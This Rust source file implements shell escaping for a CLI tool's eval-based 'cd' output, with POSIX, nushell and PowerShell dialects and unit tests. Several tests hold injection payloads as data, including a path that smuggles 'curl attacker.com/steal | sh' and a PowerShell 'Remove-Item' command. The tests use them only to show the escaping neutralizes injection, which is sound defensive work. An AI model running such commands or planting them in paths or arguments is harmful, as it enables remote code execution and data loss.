//! Shell escaping for the eval-based `cd` contract.
//!
//! Ported from `packages/core/src/utils/shell.ts`. The `start`/`jump`/`home`
//! commands print a single `cd '<path>'` line that the shell wrapper evals, so
//! the escaping must be byte-for-byte identical to the TS implementation to keep
//! that contract (and its shell-injection guarantees) intact.
//!
//! On top of those POSIX primitives sits a small *dialect* layer
//! ([`EvalDialect`] / [`format_cd_for`]): nushell has no `eval` and no escapes
//! inside single quotes, and PowerShell doubles `'` rather than backslashing it,
//! so those two shells cannot consume a POSIX `cd '<path>'` line. The dialect is
//! selected by the hidden `--eval-dialect` flag that only the NEW wrappers pass;
//! when the flag is absent the default is [`EvalDialect::Posix`], so wrappers
//! already pasted into users' rc files keep receiving byte-identical output.
//! The POSIX functions below therefore stay frozen — add dialects, never edit
//! their bodies.

/// Escape a value for use inside a single-quoted shell string.
///
/// Replaces each single quote with `'\''` — close the quoted string, emit an
/// escaped literal quote, reopen the quoted string. Everything else (including
/// `$`, backticks, double quotes) is inert inside single quotes and left as-is.
pub fn shell_escape(value: &str) -> String {
    value.replace('\'', "'\\''")
}

/// Alias of [`shell_escape`] for paths (matches the TS `escapeShellPath`).
pub fn escape_shell_path(value: &str) -> String {
    shell_escape(value)
}

/// Format a `cd '<escaped>'` command for the shell wrapper to eval.
pub fn format_cd_command(path: &str) -> String {
    format!("cd '{}'", shell_escape(path))
}

/// The stdout dialect a wrapper asks for via the hidden `--eval-dialect` flag.
///
/// `Posix` is the default so an absent flag (an old wrapper) reproduces the
/// historical output exactly.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum EvalDialect {
    /// `cd '<escaped>'` — bash, zsh, fish.
    #[default]
    Posix,
    /// `__VIBE_CD__<raw path>` — nushell.
    Nushell,
    /// `Set-Location -LiteralPath '<doubled>'` — PowerShell.
    Powershell,
}

impl EvalDialect {
    /// Accepted `--eval-dialect` value spellings (primary first).
    ///
    /// Single source of truth for the flag's vocabulary: the clap `ValueEnum` in
    /// the binary derives its name+aliases from these (drift-guarded by a test
    /// there), and `vibe doctor` matches wrapper text against them. A classifier
    /// that hardcoded its own spelling would silently stop recognizing a wrapper
    /// the moment an alias was added on the parsing side.
    pub const fn accepted_values(self) -> &'static [&'static str] {
        match self {
            EvalDialect::Posix => &["posix"],
            EvalDialect::Nushell => &["nu", "nushell"],
            EvalDialect::Powershell => &["powershell", "pwsh"],
        }
    }
}

/// The hidden flag a wrapper passes to request its stdout dialect.
pub const EVAL_DIALECT_FLAG: &str = "--eval-dialect";

/// Line prefix marking a nushell `cd` request.
///
/// Nushell has no `eval`, and its single-quoted strings support no escape
/// sequences at all, so there is no string form that safely round-trips an
/// arbitrary path through nu source code. Instead the binary emits this sentinel
/// followed by the RAW path and the wrapper strips the prefix, handing the
/// remainder to `cd` as *data* that nu never parses.
pub const NU_CD_SENTINEL: &str = "__VIBE_CD__";

/// Escape a value for use inside a PowerShell single-quoted string.
///
/// PowerShell has no backslash escape inside `'...'`; a literal quote is written
/// by doubling it (`''`).
pub fn powershell_escape(value: &str) -> String {
    value.replace('\'', "''")
}

/// Format the stdout `cd` line for `dialect`.
pub fn format_cd_for(dialect: EvalDialect, path: &str) -> String {
    match dialect {
        EvalDialect::Posix => format_cd_command(path),
        EvalDialect::Nushell => format!("{NU_CD_SENTINEL}{path}"),
        // Why not `cd` / `Set-Location -Path`: PowerShell's `-Path` treats the
        // argument as a wildcard pattern, so a real directory named `repo[1]`
        // fails to resolve. `-LiteralPath` takes the string verbatim.
        EvalDialect::Powershell => {
            format!("Set-Location -LiteralPath '{}'", powershell_escape(path))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn returns_unchanged_without_single_quotes() {
        assert_eq!(shell_escape("/tmp/mock-repo"), "/tmp/mock-repo");
    }

    #[test]
    fn escapes_single_quotes() {
        assert_eq!(shell_escape("it's"), "it'\\''s");
    }

    #[test]
    fn escapes_multiple_single_quotes() {
        assert_eq!(shell_escape("a'b'c"), "a'\\''b'\\''c");
    }

    #[test]
    fn escapes_quote_at_start_and_end() {
        assert_eq!(shell_escape("'start"), "'\\''start");
        assert_eq!(shell_escape("end'"), "end'\\''");
    }

    #[test]
    fn handles_empty_and_single_quote() {
        assert_eq!(shell_escape(""), "");
        assert_eq!(shell_escape("'"), "'\\''");
    }

    #[test]
    fn leaves_dollar_backtick_and_double_quotes_alone() {
        assert_eq!(
            shell_escape("path \"with\" doubles"),
            "path \"with\" doubles"
        );
        assert_eq!(shell_escape("$HOME/repo"), "$HOME/repo");
        assert_eq!(shell_escape("path`cmd`"), "path`cmd`");
    }

    #[test]
    fn format_cd_simple_and_escaped() {
        assert_eq!(format_cd_command("/tmp/repo"), "cd '/tmp/repo'");
        assert_eq!(format_cd_command("/tmp/repo's"), "cd '/tmp/repo'\\''s'");
    }

    #[test]
    fn format_cd_keeps_backticks_and_dollars_inert() {
        assert_eq!(
            format_cd_command("/tmp/`whoami`/$USER/repo"),
            "cd '/tmp/`whoami`/$USER/repo'"
        );
    }

    #[test]
    fn format_cd_neutralizes_injection_payload() {
        let malicious = "/tmp/x'; curl attacker.com/steal | sh; echo '";
        assert_eq!(
            format_cd_command(malicious),
            "cd '/tmp/x'\\''; curl attacker.com/steal | sh; echo '\\'''"
        );
    }

    #[test]
    fn format_cd_handles_spaces() {
        assert_eq!(
            format_cd_command("/tmp/my repo/path"),
            "cd '/tmp/my repo/path'"
        );
    }

    #[test]
    fn dialect_defaults_to_posix() {
        assert_eq!(EvalDialect::default(), EvalDialect::Posix);
    }

    #[test]
    fn posix_dialect_matches_the_frozen_format_cd_command() {
        // The whole back-compat story: no `--eval-dialect` must be byte-identical
        // to what the pre-dialect binary emitted.
        for path in ["/tmp/repo", "/tmp/it's", "/tmp/my repo/$USER/`x`"] {
            assert_eq!(
                format_cd_for(EvalDialect::Posix, path),
                format_cd_command(path)
            );
        }
    }

    #[test]
    fn formats_plain_path_per_dialect() {
        assert_eq!(
            format_cd_for(EvalDialect::Posix, "/tmp/repo"),
            "cd '/tmp/repo'"
        );
        assert_eq!(
            format_cd_for(EvalDialect::Nushell, "/tmp/repo"),
            "__VIBE_CD__/tmp/repo"
        );
        assert_eq!(
            format_cd_for(EvalDialect::Powershell, "/tmp/repo"),
            "Set-Location -LiteralPath '/tmp/repo'"
        );
    }

    #[test]
    fn formats_single_quote_path_per_dialect() {
        let path = "/tmp/it's";
        assert_eq!(
            format_cd_for(EvalDialect::Posix, path),
            "cd '/tmp/it'\\''s'"
        );
        // Nushell gets the path verbatim: the wrapper never re-parses it.
        assert_eq!(
            format_cd_for(EvalDialect::Nushell, path),
            "__VIBE_CD__/tmp/it's"
        );
        assert_eq!(
            format_cd_for(EvalDialect::Powershell, path),
            "Set-Location -LiteralPath '/tmp/it''s'"
        );
    }

    #[test]
    fn powershell_escape_doubles_quotes() {
        assert_eq!(powershell_escape("plain"), "plain");
        assert_eq!(powershell_escape("it's"), "it''s");
        assert_eq!(powershell_escape("a'b'c"), "a''b''c");
        assert_eq!(powershell_escape("'"), "''");
        assert_eq!(powershell_escape(""), "");
    }

    #[test]
    fn nushell_sentinel_keeps_posix_injection_payload_as_data() {
        let malicious = "/tmp/x'; curl attacker.com/steal | sh; echo '";
        // No quoting at all: the payload survives verbatim after the sentinel,
        // and the wrapper hands it to `cd` as a value rather than as nu source.
        assert_eq!(
            format_cd_for(EvalDialect::Nushell, malicious),
            "__VIBE_CD__/tmp/x'; curl attacker.com/steal | sh; echo '"
        );
        assert!(format_cd_for(EvalDialect::Nushell, malicious).starts_with(NU_CD_SENTINEL));
    }

    #[test]
    fn powershell_dialect_neutralizes_injection_payload() {
        let malicious = "/tmp/x'; Remove-Item x; '";
        assert_eq!(
            format_cd_for(EvalDialect::Powershell, malicious),
            "Set-Location -LiteralPath '/tmp/x''; Remove-Item x; '''"
        );
    }

    #[test]
    fn powershell_dialect_keeps_wildcard_characters_literal() {
        // Documents the -LiteralPath choice: `[`/`]`/`*`/`?` are wildcard syntax
        // for `Set-Location -Path`, so a real directory with those characters
        // would not resolve. -LiteralPath passes them through untouched.
        assert_eq!(
            format_cd_for(EvalDialect::Powershell, "C:\\repos\\wt[1]\\a*b?c"),
            "Set-Location -LiteralPath 'C:\\repos\\wt[1]\\a*b?c'"
        );
    }
}
